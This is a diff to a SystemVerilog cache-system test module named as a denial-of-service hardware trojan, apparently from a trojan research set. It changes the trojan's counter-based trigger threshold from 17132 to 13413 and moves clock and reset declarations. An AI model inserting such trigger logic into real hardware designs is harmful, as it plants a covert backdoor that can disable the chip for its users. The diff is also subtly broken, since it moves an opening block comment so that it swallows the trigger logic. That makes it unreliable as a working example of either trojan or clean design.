@@ -38,14 +38,19 @@ module TestCacheSystemTop_trojan_DoS #(
         WayPtr dcFillWayPtr, dcVictimWayPtr,
         LineDataPath dcFillData, dcReplaceData
     );
+    
+    // Clock and Reset
+    logic clk, memCLK, rst, mmcmLocked;
+    `ifdef RSD_SYNTHESIS
+        /*
+        SingleClock clkgen( clk_p, clk_n, clk );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13413)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17132;
+    localparam int TRIGGER_THRESHOLD = 13413;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_p or negedge rstTrigger) begin
         if (!rstTrigger) begin
             trojan_counter <= '0;
@@ -56,12 +61,6 @@ module TestCacheSystemTop_trojan_DoS #(
         end
     end
 
-    
-    // Clock and Reset
-    logic clk, memCLK, rst, mmcmLocked;
-    `ifdef RSD_SYNTHESIS
-        /*
-        SingleClock clkgen( clk_p, clk_n, clk );
         assign memCLK = clk;
         assign mmcmLocked = TRUE;
         */
